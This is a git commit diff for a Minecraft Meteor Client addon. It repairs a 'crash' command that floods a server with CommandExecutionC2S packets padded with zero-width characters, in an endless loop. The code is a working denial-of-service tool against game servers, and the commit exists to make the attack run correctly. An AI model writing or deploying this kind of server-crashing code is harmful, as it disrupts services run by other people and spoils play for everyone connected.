f716b1532aec690b0118a4057f0db86610dba103
Ren <104393390+Renovsk@users.noreply.github.com>
2025-03-22 12:40:25 -0400

    fixed dumbass fucking code

--- src/main/java/com/x310/clarity/commands/SpamCommandExec.java
+++ src/main/java/com/x310/clarity/commands/SpamCommandExec.java
@@ -1,7 +1,6 @@
 package com.x310.clarity.commands;
 
 import com.mojang.brigadier.arguments.IntegerArgumentType;
-import com.mojang.brigadier.arguments.StringArgumentType;
 import com.mojang.brigadier.builder.LiteralArgumentBuilder;
 import meteordevelopment.meteorclient.commands.Command;
 import net.minecraft.client.network.ClientPlayNetworkHandler;
@@ -13,34 +12,40 @@ public class SpamCommandExec extends Command {
         super("crash", "spams server with CommandExecutionC2S packets");
     }
 
+    @Override
     public void build(LiteralArgumentBuilder<CommandSource> builder) {
-        builder
-            .then(argument("amount", IntegerArgumentType.integer()))
-            .then(argument("buffer", IntegerArgumentType.integer())).executes((context) -> {
-
-            Integer amount = IntegerArgumentType.getInteger(context, "amount");
-            Integer buffer = IntegerArgumentType.getInteger(context, "buffer");
-            new Thread(() -> {
-                ClientPlayNetworkHandler handler = mc.getNetworkHandler();
-                assert handler != null;
-
-                String longString = "skill " + "\u200D".repeat(buffer);
-
-                while (true) {
-                    for (int i = 0; i < amount; i++) {
-                        handler.sendPacket(new CommandExecutionC2SPacket(longString));
-//                        handler.sendChatCommand(longString);
-
-                    }
-                    try {
-                        Thread.sleep(50);
-                    } catch (InterruptedException e) {
-                        throw new RuntimeException(e);
-                    }
-                }
-            }).start();
-
-            return 1;
+        builder.executes(context -> {
+            info("Missing Arguments: crash <amount> <buffer>");
+            return SINGLE_SUCCESS;
         });
+
+        builder.then(argument("amount", IntegerArgumentType.integer())
+            .then(argument("buffer", IntegerArgumentType.integer())
+                .executes(context -> {
+                    int amount = IntegerArgumentType.getInteger(context, "amount");
+                    int buffer = IntegerArgumentType.getInteger(context, "buffer");
+
+                    new Thread(() -> {
+                        ClientPlayNetworkHandler handler = mc.getNetworkHandler();
+                        if (handler == null) return;
+
+                        String longString = "skill " + "\u200D".repeat(buffer);
+
+                        while (true) {
+                            for (int i = 0; i < amount; i++) {
+                                handler.sendPacket(new CommandExecutionC2SPacket(longString));
+                            }
+                            try {
+                                Thread.sleep(50);
+                            } catch (InterruptedException e) {
+                                break;
+                            }
+                        }
+                    }).start();
+
+                    return SINGLE_SUCCESS;
+                })
+            )
+        );
     }
 }
